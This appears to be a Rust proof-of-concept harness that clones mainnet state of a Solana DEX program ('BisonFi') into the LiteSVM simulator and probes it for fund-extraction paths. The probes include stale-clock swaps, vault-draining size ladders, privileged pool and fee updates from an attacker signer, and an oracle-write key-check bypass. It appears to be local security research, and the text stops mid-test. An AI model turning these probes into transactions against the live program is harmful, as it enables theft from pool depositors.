// BisonFi Z3-C4 LiteSVM PoC — clone mainnet state, test live extraction paths.
// Read-only: never signs or sends anything to a real network. All execution is in-process (LiteSVM).
use base64::{engine::general_purpose::STANDARD as B64, Engine as _};
use litesvm::LiteSVM;
use solana_account::Account;
use solana_address::Address;
use solana_instruction::{AccountMeta, Instruction};
use solana_keypair::Keypair;
use solana_message::Message;
use solana_signer::Signer;
use solana_transaction::Transaction;
use std::{collections::HashMap, str::FromStr};

const PROG: &str = "BiSoNHVpsVZW2F7rx2eQ59yQwKxzU5NvBcmKshCSUypi";
const ORACLE_PROG: &str = "dijkbkCAKfFTCxQg3u1pg82gVU1jJGHBBRcteD11mBu";
const TOKEN: &str = "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA";
const CLOCK_SYSVAR: &str = "SysvarC1ock11111111111111111111111111111111";
const SYSVAR_OWNER: &str = "Sysvar1111111111111111111111111111111111111";
const SYSVAR_INSTRUCTIONS: &str = "Sysvar1nstructions1111111111111111111111111";

// clock aligned with the fixture snapshot (pool state updated slot 457,426,443; live swap 457,426,566)
const CLOCK_SLOT: u64 = 457_426_566;
const CLOCK_TS: i64 = 1_792_108_158;

fn a(s: &str) -> Address {
    Address::from_str(s).unwrap()
}

struct Env {
    svm: LiteSVM,
    accounts: HashMap<String, Address>,
}

fn load_env() -> Env {
    let mut svm = LiteSVM::new()
        .with_sigverify(false)
        .with_blockhash_check(false);
    let fx: serde_json::Value =
        serde_json::from_str(&std::fs::read_to_string("fixtures/accounts.json").unwrap()).unwrap();
    let mut accounts = HashMap::new();
    for (name, v) in fx.as_object().unwrap() {
        let addr = a(v["address"].as_str().unwrap());
        let owner = a(v["owner"].as_str().unwrap());
        let data = B64.decode(v["data_b64"].as_str().unwrap()).unwrap();
        let acc = Account {
            lamports: v["lamports"].as_u64().unwrap(),
            data,
            owner,
            executable: v["executable"].as_bool().unwrap(),
            rent_epoch: 0,
        };
        svm.set_account(addr, acc).unwrap();
        accounts.insert(name.clone(), addr);
    }
    let elf = std::fs::read("fixtures/bisonfi.elf").unwrap();
    svm.add_program(a(PROG), &elf).unwrap();
    let oelf = std::fs::read("fixtures/dijkbk-oracle.elf").unwrap();
    svm.add_program(a(ORACLE_PROG), &oelf).unwrap();
    let mut cdata = Vec::with_capacity(40);
    cdata.extend_from_slice(&CLOCK_SLOT.to_le_bytes());
    cdata.extend_from_slice(&(CLOCK_TS - 120).to_le_bytes());
    cdata.extend_from_slice(&800u64.to_le_bytes());
    cdata.extend_from_slice(&800u64.to_le_bytes());
    cdata.extend_from_slice(&CLOCK_TS.to_le_bytes());
    svm.set_account(
        a(CLOCK_SYSVAR),
        Account { lamports: 1_169_280, data: cdata, owner: a(SYSVAR_OWNER), executable: false, rent_epoch: 0 },
    )
    .unwrap();
    // LastRestartSlot sysvar (mainnet: 246,464,040 = 0x0EB0BE28). LiteSVM defaults to 0 -> swap refuses ("cluster restart").
    let mut lrs = Vec::with_capacity(8);
    lrs.extend_from_slice(&246_464_040u64.to_le_bytes());
    svm.set_account(
        a("SysvarLastRestartS1ot1111111111111111111111"),
        Account { lamports: 1_169_280, data: lrs, owner: a(SYSVAR_OWNER), executable: false, rent_epoch: 0 },
    )
    .unwrap();
    Env { svm, accounts }
}

fn token_amount(env: &Env, addr: &Address) -> u64 {
    match env.svm.get_account(addr) {
        Some(acc) if acc.data.len() >= 72 => u64::from_le_bytes(acc.data[64..72].try_into().unwrap()),
        _ => 0,
    }
}

fn token_acc_data(mint: &Address, owner: &Address, amount: u64, native_reserve: Option<u64>) -> Vec<u8> {
    let mut d = vec![0u8; 165];
    d[0..32].copy_from_slice(mint.as_ref());
    d[32..64].copy_from_slice(owner.as_ref());
    d[64..72].copy_from_slice(&amount.to_le_bytes());
    d[108] = 1;
    if let Some(r) = native_reserve {
        d[109..113].copy_from_slice(&1u32.to_le_bytes());
        d[113..121].copy_from_slice(&r.to_le_bytes());
    }
    d
}

fn setup_attacker(env: &mut Env) -> (Keypair, Address, Address, Address) {
    let user = Keypair::new();
    let upk = user.pubkey();
    env.svm
        .set_account(upk, Account { lamports: 100_000_000_000, data: vec![], owner: a("11111111111111111111111111111111"), executable: false, rent_epoch: 0 })
        .unwrap();
    let wsol_mint = a("So11111111111111111111111111111111111111112");
    let usdc_mint = a("EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v");
    // canonical ATAs
    let ata_prog = a("ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL");
    let (uwsol, _) = Address::find_program_address(&[upk.as_ref(), a(TOKEN).as_ref(), wsol_mint.as_ref()], &ata_prog);
    let (uusdc, _) = Address::find_program_address(&[upk.as_ref(), a(TOKEN).as_ref(), usdc_mint.as_ref()], &ata_prog);
    let rent = 2_039_280u64;
    let wsol_amt = 200_000_000_000u64;
    env.svm
        .set_account(uwsol, Account {
            lamports: wsol_amt + rent,
            data: token_acc_data(&wsol_mint, &upk, wsol_amt, Some(rent)),
            owner: a(TOKEN), executable: false, rent_epoch: 0,
        })
        .unwrap();
    let usdc_amt = 1_000_000_000_000u64;
    env.svm
        .set_account(uusdc, Account {
            lamports: rent,
            data: token_acc_data(&usdc_mint, &upk, usdc_amt, None),
            owner: a(TOKEN), executable: false, rent_epoch: 0,
        })
        .unwrap();
    (user, upk, uwsol, uusdc)
}

fn sha256(data: &[u8]) -> [u8; 32] {
    use std::convert::TryInto;
    const K: [u32; 64] = [
        0x428a2f98, 0x71374491, 0xb5c0fbcf, 0xe9b5dba5, 0x3956c25b, 0x59f111f1, 0x923f82a4, 0xab1c5ed5,
        0xd807aa98, 0x12835b01, 0x243185be, 0x550c7dc3, 0x72be5d74, 0x80deb1fe, 0x9bdc06a7, 0xc19bf174,
        0xe49b69c1, 0xefbe4786, 0x0fc19dc6, 0x240ca1cc, 0x2de92c6f, 0x4a7484aa, 0x5cb0a9dc, 0x76f988da,
        0x983e5152, 0xa831c66d, 0xb00327c8, 0xbf597fc7, 0xc6e00bf3, 0xd5a79147, 0x06ca6351, 0x14292967,
        0x27b70a85, 0x2e1b2138, 0x4d2c6dfc, 0x53380d13, 0x650a7354, 0x766a0abb, 0x81c2c92e, 0x92722c85,
        0xa2bfe8a1, 0xa81a664b, 0xc24b8b70, 0xc76c51a3, 0xd192e819, 0xd6990624, 0xf40e3585, 0x106aa070,
        0x19a4c116, 0x1e376c08, 0x2748774c, 0x34b0bcb5, 0x391c0cb3, 0x4ed8aa4a, 0x5b9cca4f, 0x682e6ff3,
        0x748f82ee, 0x78a5636f, 0x84c87814, 0x8cc70208, 0x90befffa, 0xa4506ceb, 0xbef9a3f7, 0xc67178f2,
    ];
    let mut h: [u32; 8] = [0x6a09e667, 0xbb67ae85, 0x3c6ef372, 0xa54ff53a, 0x510e527f, 0x9b05688c, 0x1f83d9ab, 0x5be0cd19];
    let mut msg = data.to_vec();
    let bitlen = (data.len() as u64) * 8;
    msg.push(0x80);
    while msg.len() % 64 != 56 { msg.push(0); }
    msg.extend_from_slice(&bitlen.to_be_bytes());
    for chunk in msg.chunks(64) {
        let mut w = [0u32; 64];
        for i in 0..16 { w[i] = u32::from_be_bytes(chunk[i*4..i*4+4].try_into().unwrap()); }
        for i in 16..64 {
            let s0 = w[i-15].rotate_right(7) ^ w[i-15].rotate_right(18) ^ (w[i-15] >> 3);
            let s1 = w[i-2].rotate_right(17) ^ w[i-2].rotate_right(19) ^ (w[i-2] >> 10);
            w[i] = w[i-16].wrapping_add(s0).wrapping_add(w[i-7]).wrapping_add(s1);
        }
        let (mut a1, mut b1, mut c1, mut d1, mut e1, mut f1, mut g1, mut h1) =
            (h[0], h[1], h[2], h[3], h[4], h[5], h[6], h[7]);
        for i in 0..64 {
            let s1 = e1.rotate_right(6) ^ e1.rotate_right(11) ^ e1.rotate_right(25);
            let ch = (e1 & f1) ^ ((!e1) & g1);
            let t1 = h1.wrapping_add(s1).wrapping_add(ch).wrapping_add(K[i]).wrapping_add(w[i]);
            let s0 = a1.rotate_right(2) ^ a1.rotate_right(13) ^ a1.rotate_right(22);
            let maj = (a1 & b1) ^ (a1 & c1) ^ (b1 & c1);
            let t2 = s0.wrapping_add(maj);
            h1 = g1; g1 = f1; f1 = e1; e1 = d1.wrapping_add(t1); d1 = c1; c1 = b1; b1 = a1; a1 = t1.wrapping_add(t2);
        }
        h[0]=h[0].wrapping_add(a1); h[1]=h[1].wrapping_add(b1); h[2]=h[2].wrapping_add(c1); h[3]=h[3].wrapping_add(d1);
        h[4]=h[4].wrapping_add(e1); h[5]=h[5].wrapping_add(f1); h[6]=h[6].wrapping_add(g1); h[7]=h[7].wrapping_add(h1);
    }
    let mut out = [0u8; 32];
    for i in 0..8 { out[i*4..i*4+4].copy_from_slice(&h[i].to_be_bytes()); }
    out
}

struct SwapAccounts {
    user: Address,
    pool: Address,
    vault_wsol: Address,
    vault_usdc: Address,
    user_wsol: Address,
    user_usdc: Address,
    vote: Address,
    mint_wsol: Address,
    mint_usdc: Address,
}

/// layout: 10 = [user,pool,vault_wsol,vault_usdc,user_wsol,user_usdc,token,token,sysvar,vote]
///         12 = same + [mint_wsol, mint_usdc] inserted before sysvar
fn build_swap_ix(sa: &SwapAccounts, amount: u64, min_out: u64, direction: u8, layout: u8) -> Instruction {
    let mut data = Vec::with_capacity(18);
    data.push(2u8);
    data.extend_from_slice(&amount.to_le_bytes());
    data.extend_from_slice(&min_out.to_le_bytes());
    data.push(direction);
    let mut metas = vec![
        AccountMeta::new(sa.user, true),
        AccountMeta::new(sa.pool, false),
        AccountMeta::new(sa.vault_wsol, false),
        AccountMeta::new(sa.vault_usdc, false),
        AccountMeta::new(sa.user_wsol, false),
        AccountMeta::new(sa.user_usdc, false),
        AccountMeta::new_readonly(a(TOKEN), false),
        AccountMeta::new_readonly(a(TOKEN), false),
    ];
    if layout == 12 {
        metas.push(AccountMeta::new_readonly(sa.mint_wsol, false));
        metas.push(AccountMeta::new_readonly(sa.mint_usdc, false));
    }
    metas.push(AccountMeta::new_readonly(a(SYSVAR_INSTRUCTIONS), false));
    metas.push(AccountMeta::new_readonly(sa.vote, false));
    Instruction { program_id: a(PROG), accounts: metas, data }
}

fn send(env: &mut Env, user: &Keypair, ixs: Vec<Instruction>) -> Result<litesvm::types::TransactionMetadata, litesvm::types::FailedTransactionMetadata> {
    let msg = Message::new(&ixs, Some(&user.pubkey()));
    let tx = Transaction::new(&[user], msg, env.svm.latest_blockhash());
    env.svm.send_transaction(tx)
}

fn print_result(label: &str, res: &Result<litesvm::types::TransactionMetadata, litesvm::types::FailedTransactionMetadata>) -> bool {
    match res {
        Ok(meta) => {
            println!("[{}] SUCCESS cu={}", label, meta.compute_units_consumed);
            for l in &meta.logs { println!("    log: {}", l); }
            true
        }
        Err(f) => {
            println!("[{}] FAILED err={:?}", label, f.err);
            for l in &f.meta.logs { println!("    log: {}", l); }
            false
        }
    }
}

struct Snapshot {
    vault_wsol: u64, vault_usdc: u64, user_wsol: u64, user_usdc: u64,
}
fn snap(env: &Env, sa: &SwapAccounts) -> Snapshot {
    Snapshot {
        vault_wsol: token_amount(env, &sa.vault_wsol),
        vault_usdc: token_amount(env, &sa.vault_usdc),
        user_wsol: token_amount(env, &sa.user_wsol),
        user_usdc: token_amount(env, &sa.user_usdc),
    }
}
fn print_delta(before: &Snapshot, after: &Snapshot, label: &str) {
    let dw = after.vault_wsol as i128 - before.vault_wsol as i128;
    let du = after.vault_usdc as i128 - before.vault_usdc as i128;
    println!("   [{}] vault_wsol d={} ({:.9} SOL), vault_usdc d={} ({:.6} USDC)", label, dw, dw as f64 / 1e9, du, du as f64 / 1e6);
    if dw < 0 && du > 0 {
        println!("   implied price: ${:.4}/SOL", du as f64 / 1e6 / (-dw as f64 / 1e9));
    } else if dw > 0 && du < 0 {
        println!("   implied price: ${:.4}/SOL", (-du) as f64 / 1e6 / (dw as f64 / 1e9));
    }
}

fn main() {
    println!("=== BisonFi Z3-C4 LiteSVM PoC (read-only, local clone) ===");
    let mut env = load_env();
    let (user, upk, uwsol, uusdc) = setup_attacker(&mut env);
    let pool = env.accounts["pool_state_cur"];
    let vault_wsol = env.accounts["vault_wsol_cur"];
    let vault_usdc = env.accounts["vault_usdc_cur"];
    let vote = env.accounts["vote_account"];
    let sa = SwapAccounts {
        user: upk, pool, vault_wsol, vault_usdc, user_wsol: uwsol, user_usdc: uusdc,
        vote, mint_wsol: env.accounts["mint_wsol"], mint_usdc: env.accounts["mint_usdc"],
    };

    // ---- swap variant matrix -------------------------------------------------
    // Returns (success, took_zero_path, moved_wsol, moved_usdc)
    fn try_swap(env: &mut Env, user: &Keypair, sa: &SwapAccounts, label: &str,
                amount: u64, min_out: u64, direction: u8, layout: u8, extra: Option<Address>) -> (bool, bool, i128, i128) {
        let b = snap(env, sa);
        let mut ix = build_swap_ix(sa, amount, min_out, direction, layout);
        if let Some(e) = extra { ix.accounts.push(AccountMeta::new_readonly(e, false)); }
        let res = send(env, user, vec![ix]);
        let ok = print_result(label, &res);
        let zero_path = match &res {
            Ok(m) => m.logs.iter().any(|l| l.contains("LRS0")),
            Err(e) => e.meta.logs.iter().any(|l| l.contains("LRS0")),
        };
        let a = snap(env, sa);
        let dw = a.vault_wsol as i128 - b.vault_wsol as i128;
        let du = a.vault_usdc as i128 - b.vault_usdc as i128;
        if dw != 0 || du != 0 {
            println!("   moved: vault_wsol d={} vault_usdc d={}", dw, du);
        }
        (ok, zero_path, dw, du)
    }

    println!("\n-- T0 sell 1 SOL (canonical ATAs, 10-account layout)");
    try_swap(&mut env, &user, &sa, "T0", 1_000_000_000, 0, 0, 10, None);

    println!("\n-- T1 sell 1 SOL, exact real data (1_998_690_806)");
    try_swap(&mut env, &user, &sa, "T1", 1_998_690_806, 0, 0, 10, None);

    println!("\n-- T2 sell 1000 USDC (direction=1)");
    try_swap(&mut env, &user, &sa, "T2", 1_000_000_000, 0, 1, 10, None);

    println!("\n-- T3 March-era 9-account layout (no vote)");
    let mut ix = build_swap_ix(&sa, 1_000_000_000, 0, 0, 10);
    ix.accounts.pop();
    let b = snap(&env, &sa);
    let res = send(&mut env, &user, vec![ix]);
    print_result("T3", &res);
    print_delta(&b, &snap(&env, &sa), "T3");

    println!("\n-- T4 12-account layout (with mints)");
    try_swap(&mut env, &user, &sa, "T4", 1_000_000_000, 0, 0, 12, None);

    println!("\n-- T5 11-account layout (extra 4cG31VNF... account appended)");
    try_swap(&mut env, &user, &sa, "T5", 1_000_000_000, 0, 0, 10, Some(a("4cG31VNF9TzFinNc7BmnjhFvGjxkY3sCETVMtMgbrhPs")));

    println!("\n-- T6 min_out=1");
    try_swap(&mut env, &user, &sa, "T6", 1_000_000_000, 1, 0, 10, None);

    // ---- staleness experiments: vary the clock relative to the state's last update slot
    let st = env.svm.get_account(&pool).unwrap().data;
    let last_slot = u64::from_le_bytes(st[72..80].try_into().unwrap());
    let st_ts = u64::from_le_bytes(st[88..96].try_into().unwrap()) / 1_000_000_000;
    println!("\n-- state last_update_slot={} ts={}", last_slot, st_ts);
    let set_clock = |env: &mut Env, delta: u64| {
        let slot = last_slot + delta;
        let ts = (st_ts + (delta as f64 * 0.4) as u64) as i64;
        let mut cdata = Vec::with_capacity(40);
        cdata.extend_from_slice(&slot.to_le_bytes());
        cdata.extend_from_slice(&(ts - 120).to_le_bytes());
        cdata.extend_from_slice(&800u64.to_le_bytes());
        cdata.extend_from_slice(&800u64.to_le_bytes());
        cdata.extend_from_slice(&ts.to_le_bytes());
        env.svm.set_account(a(CLOCK_SYSVAR), Account { lamports: 1_169_280, data: cdata, owner: a(SYSVAR_OWNER), executable: false, rent_epoch: 0 }).unwrap();
    };
    for delta in [0u64, 1, 2, 3, 4, 8] {
        set_clock(&mut env, delta);
        println!("\n-- T7 clock = last_update + {}", delta);
        try_swap(&mut env, &user, &sa, &format!("T7+{}", delta), 1_000_000_000, 0, 0, 10, None);
    }

    // ---- size ladder at the working clock (last_update + 1)
    set_clock(&mut env, 1);
    println!("\n== size ladder (sell SOL for USDC), clock=last_update+1");
    for amt in [1_000_000_000u64, 10_000_000_000, 100_000_000_000, 500_000_000_000, 1_000_000_000_000, 5_000_000_000_000, 20_000_000_000_000] {
        let b = snap(&env, &sa);
        let res = send(&mut env, &user, vec![build_swap_ix(&sa, amt, 0, 0, 10)]);
        let ok = match &res { Ok(m) => { println!("[ladder {}] SUCCESS cu={} logs_tail={:?}", amt, m.compute_units_consumed, m.logs.last()); true }, Err(e) => { println!("[ladder {}] FAILED {:?}", amt, e.err); false } };
        if ok {
            let a = snap(&env, &sa);
            let dw = a.vault_wsol as i128 - b.vault_wsol as i128;
            let du = a.vault_usdc as i128 - b.vault_usdc as i128;
            if du < 0 {
                println!("   IN  {:.9} SOL -> OUT {:.6} USDC  price=${:.4}/SOL", dw as f64 / 1e9, -du as f64 / 1e6, (-du as f64 / 1e6) / (dw as f64 / 1e9));
            } else {
                println!("   moved vault_wsol d={} vault_usdc d={}", dw, du);
            }
        }
    }

    // ---- USDC -> WSOL ladder (direction=1)
    println!("\n== size ladder (sell USDC for SOL), clock=last_update+1");
    for amt in [1_000_000u64, 100_000_000, 1_000_000_000, 10_000_000_000, 100_000_000_000, 500_000_000_000] {
        let b = snap(&env, &sa);
        let res = send(&mut env, &user, vec![build_swap_ix(&sa, amt, 0, 1, 10)]);
        let ok = match &res { Ok(m) => { println!("[usdc-ladder {}] SUCCESS cu={}", amt, m.compute_units_consumed); true }, Err(e) => { println!("[usdc-ladder {}] FAILED {:?}", amt, e.err); false } };
        if ok {
            let a = snap(&env, &sa);
            let dw = a.vault_wsol as i128 - b.vault_wsol as i128;
            let du = a.vault_usdc as i128 - b.vault_usdc as i128;
            if dw < 0 {
                println!("   IN  {:.6} USDC -> OUT {:.9} SOL  price=${:.4}/SOL", du as f64 / 1e6, -dw as f64 / 1e9, (du as f64 / 1e6) / (-dw as f64 / 1e9));
            } else {
                println!("   moved vault_wsol d={} vault_usdc d={}", dw, du);
            }
        }
    }

    // T4: MM batch update disc20 from ATTACKER (wrong signer) vs CORRECT signer
    println!("\n-- T8 exact replay of real swap (user 77777nPh, real ATAs, exact data)");
    let ru = env.accounts["real_user"];
    let rw = env.accounts["real_user_wsol_ata"];
    let rd = env.accounts["real_user_usdc_ata"];
    let data8 = hex_to_vec("02f625237700000000000000000000000000");
    let ix8 = Instruction {
        program_id: a(PROG),
        accounts: vec![
            AccountMeta::new(ru, true),
            AccountMeta::new(pool, false),
            AccountMeta::new(vault_wsol, false),
            AccountMeta::new(vault_usdc, false),
            AccountMeta::new(rw, false),
            AccountMeta::new(rd, false),
            AccountMeta::new_readonly(a(TOKEN), false),
            AccountMeta::new_readonly(a(TOKEN), false),
            AccountMeta::new_readonly(a(SYSVAR_INSTRUCTIONS), false),
            AccountMeta::new_readonly(vote, false),
        ],
        data: data8,
    };
    let b8 = (token_amount(&env, &vault_wsol), token_amount(&env, &vault_usdc), token_amount(&env, &rw), token_amount(&env, &rd));
    let msg8 = Message::new(&[ix8], Some(&ru));
    let mut tx8 = Transaction::new_unsigned(msg8);
    tx8.signatures = vec![Default::default(); tx8.message.header.num_required_signatures as usize];
    let res8 = env.svm.send_transaction(tx8);
    let r8 = match res8 { Ok(m) => Ok(m), Err(e) => Err(e) };
    print_result("T8", &r8);
    let a8 = (token_amount(&env, &vault_wsol), token_amount(&env, &vault_usdc), token_amount(&env, &rw), token_amount(&env, &rd));
    println!("   vault_wsol d={} vault_usdc d={} user_wsol d={} user_usdc d={}",
        a8.0 as i128 - b8.0 as i128, a8.1 as i128 - b8.1 as i128, a8.2 as i128 - b8.2 as i128, a8.3 as i128 - b8.3 as i128);

    println!("\n-- T4c MM update disc27 (batch oracle lean) from attacker signer");
    let pool_for_ix = pool;
    let d27 = hex_to_vec("1b4223d1eb07d8de1800000000000030fcd042c9d940010000e8b5431b020002800000000017bd96e607d8de180000000000f8a49329afb05100000000e8b5431bc800c880000000008e0e0de407d8de180000000000801f0d5fb1cd8909000000e8b5431b0200028000006601");
    let ix27 = Instruction {
        program_id: a(PROG),
        accounts: vec![
            AccountMeta::new_readonly(upk, true),
            AccountMeta::new_readonly(a(CLOCK_SYSVAR), false),
            AccountMeta::new(pool_for_ix, false),
            AccountMeta::new(pool_for_ix, false),
            AccountMeta::new(pool_for_ix, false),
        ],
        data: d27,
    };
    let before27 = env.svm.get_account(&pool).map(|x| x.data.clone()).unwrap_or_default();
    let res27 = send(&mut env, &user, vec![ix27]);
    print_result("T4c", &res27);
    let after27 = env.svm.get_account(&pool).map(|x| x.data.clone()).unwrap_or_default();
    println!("   pool state changed: {}", before27 != after27);

    println!("\n-- T4d fee-config disc16 from attacker signer");
    let d16 = hex_to_vec("101a001a001a00000000e1f5050000000000943577000000000000000000000000ffffffff80ffffff0000000000000000feffffff00feffff0000000000000000fdffffff00f6ffff0000000000000000fcffffff00e7ffff0000000000000000010000008000000000000000000000000200000000020000000000000000000003000000000a00000000000000000000040000000019000010270000102700000000000000000000e1b5431b0000000000000000000000000000001a001a00000002006400648d0c00000a010100000000000000000000000000000000000000000000000000000000000000000000000128beb00e000000000d010000000000000001");
    let ix16 = Instruction {
        program_id: a(PROG),
        accounts: vec![
            AccountMeta::new_readonly(upk, true),
            AccountMeta::new(pool_for_ix, false),
        ],
        data: d16,
    };
    let before16 = env.svm.get_account(&pool).map(|x| x.data.clone()).unwrap_or_default();
    let res16 = send(&mut env, &user, vec![ix16]);
    print_result("T4d", &res16);
    let after16 = env.svm.get_account(&pool).map(|x| x.data.clone()).unwrap_or_default();
    println!("   pool state changed: {}", before16 != after16);

    println!("\n-- T4a MM update disc20, attacker signer (expect reject)");
    let d20 = hex_to_vec("144d7c78eb07d8de1800000000006c87f700ea556900000000e7b5431b020002004d7c78eb07d8de180000000000bc3ea368f5716900000000e7b5431b020002004d7c78eb07d8de18000000000088feca250f6a6900000000e7b5431b02000200");
    let pool_for_ix = pool;
    let mk20 = |signer: Address, s_is_signer: bool| Instruction {
        program_id: a(PROG),
        accounts: vec![
            AccountMeta::new_readonly(signer, s_is_signer),
            AccountMeta::new_readonly(a(CLOCK_SYSVAR), false),
            AccountMeta::new(pool_for_ix, false),
            AccountMeta::new(pool_for_ix, false),
            AccountMeta::new(pool_for_ix, false),
        ],
        data: d20.clone(),
    };
    let before = env.svm.get_account(&pool).map(|x| x.data.clone()).unwrap_or_default();
    let res = send(&mut env, &user, vec![mk20(upk, true)]);
    print_result("T4a", &res);
    let after = env.svm.get_account(&pool).map(|x| x.data.clone()).unwrap_or_default();
    println!("   pool state changed: {}", before != after);

    println!("\n-- T4b MM update disc20, correct pool authority signer (Gs7aQqWz...)");
    let mm = a("Gs7aQqWznF4F2hb26kt3NdMnM3RTnNcgpWMc9NLJaj6y");
    let before = env.svm.get_account(&pool).map(|x| x.data.clone()).unwrap_or_default();
    let msg = Message::new(&[mk20(mm, true)], Some(&upk));
    let mut tx = Transaction::new_unsigned(msg);
    tx.signatures = vec![Default::default(); tx.message.header.num_required_signatures as usize];
    let res = env.svm.send_transaction(tx);
    let r2 = match res { Ok(m) => Ok(m), Err(e) => Err(e) };
    print_result("T4b", &r2);
    let after = env.svm.get_account(&pool).map(|x| x.data.clone()).unwrap_or_default();
    println!("   pool state changed: {}", before != after);

    // T5: oracle account write from attacker, with and without oracle-account co-signature
    println!("\n-- T5a oracle write, attacker only (oracle acct not signer)");
    let oracle_acct = env.accounts["oracle_sol_usdc"];
    let before_o = env.svm.get_account(&oracle_acct).map(|x| x.data.clone()).unwrap_or_default();
    let odata = hex_to_vec("cfdb4606000000000cdd46060000000099b9431b40420f003559ed41a1010000ff");
    let ix = Instruction {
        program_id: a(ORACLE_PROG),
        accounts: vec![AccountMeta::new_readonly(upk, true), AccountMeta::new(oracle_acct, false)],
        data: odata.clone(),
    };
    let res = send(&mut env, &user, vec![ix]);
    print_result("T5a", &res);
    let after_o = env.svm.get_account(&oracle_acct).map(|x| x.data.clone()).unwrap_or_default();
    println!("   oracle changed: {}", before_o != after_o);

    println!("\n-- T5b oracle write, oracle acct marked as signer (publisher co-sign emulation)");
    let ix = Instruction {
        program_id: a(ORACLE_PROG),
        accounts: vec![AccountMeta::new_readonly(upk, true), AccountMeta::new(oracle_acct, true)],
        data: odata,
    };
    let msg = Message::new(&[ix], Some(&upk));
    let mut tx = Transaction::new_unsigned(msg);
    tx.signatures = vec![Default::default(); tx.message.header.num_required_signatures as usize];
    let res = env.svm.send_transaction(tx);
    let r2 = match res { Ok(m) => Ok(m), Err(e) => Err(e) };
    print_result("T5b", &r2);
    let after_o2 = env.svm.get_account(&oracle_acct).map(|x| x.data.clone()).unwrap_or_default();
    println!("   oracle changed: {}", after_o != after_o2);
    println!("   oracle data now: {}", hex(&after_o2));

    println!("\n-- T5c oracle write, updater key as NON-signer (attacker pays) -- key-check bypass test");
    let updater = a("FTp1BybZ51NiZKbnZH6MsrV3tUZNauhpQMbBcqYUEr5f");
    env.svm.set_account(updater, Account { lamports: 1_000_000_000, data: vec![], owner: a("11111111111111111111111111111111"), executable: false, rent_epoch: 0 }).unwrap();
    let odata2 = hex_to_vec("0000000000000000ffffffffffffffff0000000000000000ffffffffffffffff00");
    let before_o3 = env.svm.get_account(&oracle_acct).map(|x| x.data.clone()).unwrap_or_default();
    let ix = Instruction {
        program_id: a(ORACLE_PROG),
        accounts: vec![AccountMeta::new_readonly(updater, false), AccountMeta::new(oracle_acct, false)],
        data: odata2.clone(),
    };
    let res = send(&mut env, &user, vec![ix]);
    print_result("T5c", &res);
    let after_o3 = env.svm.get_account(&oracle_acct).map(|x| x.data.clone()).unwrap_or_default();
    println!("   oracle changed: {}", before_o3 != after_o3);
    println!("   oracle data now: {}", hex(&after_o3));

    println!("\n-- T5d oracle write, updater key AS SIGNER (authorized publisher)");
    let ix = Instruction {
        program_id: a(ORACLE_PROG),
        accounts: vec![AccountMeta::new_readonly(updater, true), AccountMeta::new(oracle_acct, false)],
        data: odata2,
    };
    let msg = Message::new(&[ix], Some(&upk));
    let mut tx = Transaction::new_unsigned(msg);
    tx.signatures = vec![Default::default(); tx.message.header.num_required_signatures as usize];
    let res = env.svm.send_transaction(tx);
    let r2 = match res { Ok(m) => Ok(m), Err(e) => Err(e) };
    print_result("T5d", &r2);
    let after_o4 = env.svm.get_account(&oracle_acct).map(|x| x.data.clone()).unwrap_or_default();
    println!("   oracle changed: {}", after_o3 != after_o4);
    println!("   oracle data now: {}", hex(&after_o4));

    // ---- T9: per-swap size cap bisect (SOL in) at fresh clock
    set_clock(&mut env, 1);
    println!("\n== T9 per-swap size cap (SOL->USDC)");
    for amt in [100_000_000_000u64, 200_000_000_000, 300_000_000_000, 400_000_000_000, 500_000_000_000] {
        let res = send(&mut env, &user, vec![build_swap_ix(&sa, amt, 0, 0, 10)]);
        match &res {
            Ok(m) => println!("   {} SOL: SUCCESS cu={} (price ok)", amt as f64 / 1e9, m.compute_units_consumed),
            Err(e) => println!("   {} SOL: FAILED {:?}", amt as f64 / 1e9, e.err),
        }
    }

    // ---- T10: old pool (51FQwjr, ~$4.9M) with clock near its last update (April) and now
    println!("\n== T10 old pool SOL-USDC-Pool1 (state last update 2026-04-23)");
    let opool = env.accounts["pool_state_old"];
    let owsol = env.accounts["vault_wsol_old"];
    let ousdc = env.accounts["vault_usdc_old"];
    let ost = env.svm.get_account(&opool).unwrap().data;
    let o_last = u64::from_le_bytes(ost[72..80].try_into().unwrap());
    let o_ts = u64::from_le_bytes(ost[88..96].try_into().unwrap()) / 1_000_000_000;
    println!("   old state last_slot={} ts={}", o_last, o_ts);
    let osa = SwapAccounts { user: upk, pool: opool, vault_wsol: owsol, vault_usdc: ousdc, user_wsol: uwsol, user_usdc: uusdc, vote, mint_wsol: env.accounts["mint_wsol"], mint_usdc: env.accounts["mint_usdc"] };
    // (a) clock = now (real world)
    set_clock(&mut env, 1);
    try_swap(&mut env, &user, &osa, "T10a-now", 1_000_000_000, 0, 0, 10, None);
    // (b) clock = old state last update + 1 (simulates April)
    {
        let slot = o_last + 1;
        let ts = (o_ts + 1) as i64;
        let mut cdata = Vec::with_capacity(40);
        cdata.extend_from_slice(&slot.to_le_bytes());
        cdata.extend_from_slice(&(ts - 120).to_le_bytes());
        cdata.extend_from_slice(&800u64.to_le_bytes());
        cdata.extend_from_slice(&800u64.to_le_bytes());
        cdata.extend_from_slice(&ts.to_le_bytes());
        env.svm.set_account(a(CLOCK_SYSVAR), Account { lamports: 1_169_280, data: cdata, owner: a(SYSVAR_OWNER), executable: false, rent_epoch: 0 }).unwrap();
    }
    try_swap(&mut env, &user, &osa, "T10b-april-clock", 1_000_000_000, 0, 0, 10, None);

    // ---- T11: disc-7 instruction (reserve/internal variant) from attacker signer
    println!("\n== T11 disc-7 instruction from attacker (observed live: 10 accts, 19-byte data)");
    for amt in [15_343_548u64, 1_000_000_000] {
        let data7 = {
            let mut d = vec![7u8];
            d.extend_from_slice(&amt.to_le_bytes());
            d.extend_from_slice(&0u64.to_le_bytes());
            d.push(1);
            d.push(0);
            d
        };
        let ix = Instruction {
            program_id: a(PROG),
            accounts: vec![
                AccountMeta::new(upk, true),
                AccountMeta::new(pool, false),
                AccountMeta::new(vault_wsol, false),
                AccountMeta::new(vault_usdc, false),
                AccountMeta::new(uwsol, false),
                AccountMeta::new(uusdc, false),
                AccountMeta::new_readonly(a(TOKEN), false),
                AccountMeta::new_readonly(a(TOKEN), false),
                AccountMeta::new_readonly(env.accounts["oracle_sol_usdc"], false),
                AccountMeta::new_readonly(vote, false),
            ],
            data: data7,
        };
        let b = snap(&env, &sa);
        let res = send(&mut env, &user, vec![ix]);
        let ok = match &res {
